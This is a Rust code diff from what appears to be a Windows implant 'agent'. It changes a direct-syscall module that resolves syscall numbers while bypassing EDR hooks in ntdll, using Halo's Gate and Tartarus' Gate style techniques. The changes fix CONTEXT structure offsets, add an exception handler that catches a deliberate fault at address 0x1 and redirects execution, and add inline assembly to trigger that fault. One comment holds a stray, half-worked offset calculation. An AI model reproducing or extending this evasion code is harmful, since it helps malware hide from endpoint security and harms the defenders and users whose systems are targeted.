@@ -71,7 +71,7 @@
 //! and the config selects `ExceptionBased` or `Hybrid` mode.  On failure, it
 //! falls back to the existing Halo's Gate pipeline.
 
-#![cfg(all(windows, feature = "direct-syscalls"))]
+#![cfg(all(windows, feature = "direct-syscalls", target_arch = "x86_64"))]
 
 use std::cell::Cell;
 use std::sync::atomic::{AtomicBool, AtomicPtr, Ordering};
@@ -120,11 +120,20 @@ struct ExceptionRecord {
 }
 
 /// Windows x64 CONTEXT structure (minimal — only Rip field needed here).
+///
+/// On x64, CONTEXT.Rip is at byte offset 0xF8:
+///   P1Home–P6Home (48 B) + ContextFlags/MxCsr/Segs/EFlags (24 B) +
+///   Dr0–Dr7 (48 B) + Rax–R15 (112 B) = 232 = 0xE8 … wait, 6×8+8+2×8+8×8+16×8
+///   P1Home(8)+P2Home(8)+P3Home(8)+P4Home(8)+P5Home(8)+P6Home(8)=0x30
+///   ContextFlags(4)+MxCsr(4)+SegCs(2)+SegDs(2)+SegEs(2)+SegFs(2)+
+///   SegGs(2)+SegSs(2)+EFlags(4)=0x18 → cumulative 0x48
+///   Dr0(8)×6=0x30 → cumulative 0x78
+///   Rax–R15 (16 regs × 8 B = 0x80) → Rip starts at 0x78+0x80 = 0xF8.
 #[repr(C)]
 struct Context {
-    _pad: [u8; 0xF80], // offset 0x00 – 0xF7F: P1Home..FltSave
-    Rip: u64,          // offset 0xF80
-    _pad2: [u8; 0x4D0], // remaining CONTEXT fields
+    _pad: [u8; 0xF8], // P1Home .. R15 (offsets 0x00 – 0xF7)
+    Rip: u64,         // offset 0xF8
+    _pad2: [u8; 0x3D0], // FltSave .. end (total CONTEXT = 0x4D0)
 }
 
 /// Windows EXCEPTION_POINTERS.
@@ -135,7 +144,7 @@ struct ExceptionPointers {
 }
 
 // Static assertions for CONTEXT layout.
-const _: () = assert!(std::mem::offset_of!(Context, Rip) == 0xF80);
+const _: () = assert!(std::mem::offset_of!(Context, Rip) == 0xF8);
 
 // ─── Thread-Local Capture State ───────────────────────────────────────────
 //
@@ -149,6 +158,13 @@ thread_local! {
 
     /// The captured SSN, set by the VEH handler on successful extraction.
     static CAPTURED_SSN: Cell<Option<u32>> = Cell::new(None);
+
+    /// Continuation address for the controlled fault probe (fault at 0x1).
+    /// The inline-asm slow-path stores the address of the instruction after
+    /// the faulting `mov al, [rax]` here before triggering the fault.  The
+    /// VEH handler reads it to advance CONTEXT.Rip past the fault so that
+    /// `EXCEPTION_CONTINUE_EXECUTION` does not cause an infinite fault loop.
+    static FAULT_RESUME_RIP: Cell<usize> = Cell::new(0);
 }
 
 // ─── Global State ─────────────────────────────────────────────────────────
@@ -342,31 +358,36 @@ unsafe extern "system" fn veh_exception_ssn_handler(
         return EXCEPTION_CONTINUE_SEARCH;
     }
 
-    // Read the faulting instruction pointer from the context.
-    let ctx = &*ep.ContextRecord;
+    // Determine whether this is a controlled probe (fault at address 0x1
+    // triggered intentionally by the slow-path inline asm).  If so,
+    // FAULT_RESUME_RIP holds the continuation address and we must advance
+    // CONTEXT.Rip past the faulting instruction before continuing.
+    let resume_rip = FAULT_RESUME_RIP.with(|c| c.get());
+    let is_controlled_probe = resume_rip != 0;
+
+    // Need a mutable reference to the context so we can update Rip.
+    let ctx = unsafe { &mut *ep.ContextRecord };
     let rip = ctx.Rip as usize;
 
-    // Verify the fault is in or near the target function.
-    // We use a generous range check: the fault might be at the hooked
-    // entry point or a few bytes in (some hooks trigger the fault on a
-    // memory access within the trampoline).
-    let ntdll_range = match NTDLL_RANGE.get() {
-        Some(&r) => r,
-        None => return EXCEPTION_CONTINUE_SEARCH,
-    };
-
-    // Accept faults anywhere within ntdll (the hook chain may lead to
-    // trampolines inside ntdll's address space).
-    if rip < ntdll_range.0 || rip >= ntdll_range.1 {
-        // Also accept faults at the resolve address itself (for the case
-        // where we deliberately cause a fault at the function entry).
-        let distance = if rip > resolve_addr {
-            rip - resolve_addr
-        } else {
-            resolve_addr - rip
+    // For organic faults (e.g., guard page inside ntdll trampolines) verify
+    // the RIP is within ntdll or very close to the resolve address.  For
+    // controlled probes the fault occurs at address 0x1, so RIP points into
+    // agent code — skip the ntdll range check entirely.
+    if !is_controlled_probe {
+        let ntdll_range = match NTDLL_RANGE.get() {
+            Some(&r) => r,
+            None => return EXCEPTION_CONTINUE_SEARCH,
         };
-        if distance > 4096 {
-            return EXCEPTION_CONTINUE_SEARCH;
+
+        if rip < ntdll_range.0 || rip >= ntdll_range.1 {
+            let distance = if rip > resolve_addr {
+                rip - resolve_addr
+            } else {
+                resolve_addr - rip
+            };
+            if distance > 4096 {
+                return EXCEPTION_CONTINUE_SEARCH;
+            }
         }
     }
 
@@ -388,11 +409,22 @@ unsafe extern "system" fn veh_exception_ssn_handler(
     CAPTURED_SSN.with(|cell| cell.set(Some(ssn)));
     PENDING_RESOLVE_ADDR.with(|cell| cell.set(NO_ACTIVE_RESOLVE));
 
+    // For controlled probes: redirect execution to the stored resume label
+    // (the instruction immediately after `mov al, byte ptr [rax]`) so that
+    // returning EXCEPTION_CONTINUE_EXECUTION does not re-execute the
+    // faulting instruction and enter an infinite fault loop.
+    if is_controlled_probe {
+        ctx.Rip = resume_rip as u64;
+        FAULT_RESUME_RIP.with(|c| c.set(0));
+    }
+
     log::debug!(
-        "exception_ssn: captured SSN={} for resolve_addr={:#x} (fault at rip={:#x})",
+        "exception_ssn: captured SSN={} for resolve_addr={:#x} \
+         (fault rip={:#x}, controlled={})",
         ssn,
         resolve_addr,
-        rip
+        rip,
+        is_controlled_probe
     );
 
     EXCEPTION_CONTINUE_EXECUTION
@@ -539,70 +571,59 @@ pub fn resolve_ssn_via_exception(func_name: &str) -> Option<u32> {
     CAPTURED_SSN.with(|cell| cell.set(None));
     PENDING_RESOLVE_ADDR.with(|cell| cell.set(func_addr));
 
-    // Trigger an access violation by reading from a known-invalid address.
-    // The VEH handler will intercept this and extract the SSN.
+    // Trigger a STATUS_ACCESS_VIOLATION at address 0x1 (always unmapped).
     //
-    // Safety: We use `std::ptr::read_volatile` on address 0x1 which will
-    // always fault.  The VEH handler catches the resulting exception and
-    // extracts the SSN before returning EXCEPTION_CONTINUE_EXECUTION.
+    // The inline-asm sequence:
+    //   ① lea rax, [rip + 99f]          — compute the address of the resume
+    //                                      label (the instruction after the
+    //                                      faulting `mov al, [rax]`).
+    //   ② mov qword ptr [resume], rax   — store it in the thread-local
+    //                                      FAULT_RESUME_RIP slot so the VEH
+    //                                      handler can advance CONTEXT.Rip.
+    //   ③ mov rax, 1                    — load the permanently-unmapped address.
+    //   ④ mov al, byte ptr [rax]        — STATUS_ACCESS_VIOLATION at address 1;
+    //                                      the VEH handler catches this,
+    //                                      walks the hook chain from func_addr,
+    //                                      captures the SSN, sets Rip to the
+    //                                      stored resume address, and returns
+    //                                      EXCEPTION_CONTINUE_EXECUTION.
+    //   ⑤ 99:                           — execution resumes here after the VEH
+    //                                      handler has handled the exception.
     //
-    // However, we can't actually resume execution at the faulting instruction
-    // because it will just fault again.  Instead, we use a different approach:
-    // we call the function pointer itself (which will hit the hooked prologue
-    // and the EDR hook will eventually execute the original code, triggering
-    // an exception in the right context).  But this is dangerous for arbitrary
-    // Nt* functions.
-    //
-    // The actual Tartarus' Gate technique works differently: it forces the
-    // Nt* stub to execute by calling it with intentionally invalid parameters
-    // that cause a STATUS_ACCESS_VIOLATION *inside* the syscall stub.  The VEH
-    // handler then reads CONTEXT.Rip to find where the exception occurred.
-    //
-    // For safety and reliability, we use a modified approach:
-    // 1. Write a `mov eax, imm32` + `int 2d` (or `ud2`) sequence to a
-    //    readable/writable page.
-    // 2. The `int 2d` triggers an exception, and the VEH handler reads the
-    //    imm32 from the preceding `mov eax`.
-    //
-    // But since we already have the function address and can walk the chain,
-    // the chain walk above should handle most cases.  The exception path
-    // is a theoretical fallback for deeply obfuscated hooks.
+    // If the VEH handler successfully captured the SSN, CAPTURED_SSN will be
+    // set when we reach the check below.
 
-    // Since the direct chain walk already failed, we attempt to probe by
-    // touching the function entry point directly.  If the page is readable,
-    // this won't fault and we just re-try the chain walk with tighter
-    // parameters.  If the page is not readable (unlikely for ntdll), the
-    // VEH handler catches the fault.
-    let probe_result = unsafe {
-        // Read the first byte of the function to check page accessibility.
-        // If this doesn't fault, the chain walk should have worked.
-        let _first_byte = std::ptr::read_volatile(func_addr as *const u8);
+    // Obtain the raw pointer to the thread-local Cell's inner value so the
+    // inline asm can write to it without an intervening Rust call (which
+    // would corrupt the asm layout and invalidate the LEA-computed offset).
+    let resume_rip_ptr: *mut usize =
+        FAULT_RESUME_RIP.with(|c| c.as_ptr() as *mut usize);
 
-        // If we get here, the page is readable and the chain walk should
-        // have succeeded.  Try one more time with a different strategy:
-        // scan the raw bytes at the function address for any `B8 xx xx xx xx`
-        // pattern, even if the hook chain is unusual.
-        scan_for_mov_eax(func_addr + 16, 48)
-    };
+    unsafe {
+        std::arch::asm!(
+            // ① Compute the address of the resume label and persist it.
+            "lea rax, [rip + 99f]",
+            "mov qword ptr [{resume}], rax",
+            // ② Fault at address 1 — always an unmapped page.
+            "mov rax, 1",
+            "mov al, byte ptr [rax]",   // STATUS_ACCESS_VIOLATION at 0x1
+            // ③ Resume here after the VEH handler advances CONTEXT.Rip.
+            "99:",
+            resume = in(reg) resume_rip_ptr,
+            lateout("rax") _,
+            options(nostack),
+        );
+    }
 
-    // Clear the pending resolve state.
+    // Clear pending state regardless of outcome.
     PENDING_RESOLVE_ADDR.with(|cell| cell.set(NO_ACTIVE_RESOLVE));
+    FAULT_RESUME_RIP.with(|c| c.set(0));
 
     // Check if the VEH handler captured an SSN.
     let captured = CAPTURED_SSN.with(|cell| cell.get());
     if let Some(ssn) = captured {
         log::info!(
-            "exception_ssn: resolved SSN={} for {} via exception handler",
-            ssn,
-            func_name
-        );
-        return Some(ssn);
-    }
-
-    // Return the probe result (raw byte scan) if available.
-    if let Some(ssn) = probe_result {
-        log::debug!(
-            "exception_ssn: resolved SSN={} for {} via raw byte scan",
+            "exception_ssn: resolved SSN={} for {} via exception-based probe (fault at 0x1)",
             ssn,
             func_name
         );
